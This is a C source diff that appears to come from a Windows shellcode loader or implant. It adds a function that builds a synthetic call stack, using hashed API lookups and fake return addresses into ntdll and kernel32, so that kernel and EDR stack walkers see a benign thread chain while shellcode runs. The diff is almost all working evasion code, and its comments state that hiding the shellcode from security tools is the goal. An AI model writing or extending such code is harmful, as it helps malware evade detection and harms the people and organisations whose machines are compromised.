@@ -80,6 +80,64 @@ PVOID GetRandomCallGadget(VOID) {
 }
 
 // -----------------------------------------------
+// Build a synthetic call stack (Draugr MVP).
+//
+// Allocates a 1 MB private buffer and writes three fake return
+// addresses near the top. Each points 0x20 bytes past an exported
+// entry (RtlUserThreadStart, BaseThreadInitThunk, NtWaitForSingleObject)
+// so the RIP lands inside the function body — within its legit
+// RUNTIME_FUNCTION Begin/End range, giving stackwalker a valid handle.
+//
+// Returned pointer is the synthetic RSP (top-of-stack = fake_ret_inner).
+// SpoofCallback's asm stub loads this value into RSP before jumping
+// to the call gadget, so kernel-side callstack walkers see a plausible
+// "fresh thread" chain instead of our fiber/worker stack bottom.
+//
+// Frame layout (lower addresses at the bottom):
+//   [buffer  .. pRsp-X]       <-- room for shellcode to push into
+//   pRsp     -> fake_ret_inner   (NtWaitForSingleObject + 0x20)
+//   pRsp+8   -> fake_ret_mid     (RtlUserThreadStart + 0x20)
+//   pRsp+16  -> fake_ret_outer   (BaseThreadInitThunk + 0x20)
+//   [above pRsp+24 .. buffer end]  unused headroom
+// -----------------------------------------------
+#define FAKE_STACK_BYTES   (1024 * 1024)   /* 1 MB total */
+#define FAKE_STACK_HEADROOM 0x10000         /* 64 KB above RSP, unused */
+
+PVOID BuildSyntheticStack(IN PAPI_HASHING pApi) {
+
+    (void)pApi;
+
+    PVOID pNtdll    = FindLoadedModuleW(L"NTDLL.DLL");
+    PVOID pKernel32 = FindLoadedModuleW(L"KERNEL32.DLL");
+    if (!pNtdll || !pKernel32)
+        return NULL;
+
+    PVOID pInner = FetchExportAddress(pNtdll, NtWaitForSingleObject_JOAAT);
+    PVOID pMid   = FetchExportAddress(pNtdll, RtlUserThreadStart_JOAAT);
+    PVOID pOuter = FetchExportAddress(pKernel32, BaseThreadInitThunk_JOAAT);
+    if (!pInner || !pMid || !pOuter)
+        return NULL;
+
+    // Offset past each function's prologue so the fake RIP lands
+    // solidly inside the function body (and thus inside the module's
+    // RUNTIME_FUNCTION Begin/End range).
+    pInner = (PBYTE)pInner + 0x20;
+    pMid   = (PBYTE)pMid   + 0x20;
+    pOuter = (PBYTE)pOuter + 0x20;
+
+    PBYTE pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, FAKE_STACK_BYTES);
+    if (!pBuffer)
+        return NULL;
+
+    PVOID* pRsp = (PVOID*)(pBuffer + FAKE_STACK_BYTES - FAKE_STACK_HEADROOM);
+    pRsp[0] = pInner;   // shellcode pops this first on its first `ret`
+    pRsp[1] = pMid;     // then this
+    pRsp[2] = pOuter;   // outermost (thread-start-like) frame
+
+    return (PVOID)pRsp;
+}
+
+// -----------------------------------------------
 // Synthetic RUNTIME_FUNCTION registered with
 // RtlAddFunctionTable after stomping. The kernel
 // stores the pointer — it must have static lifetime.
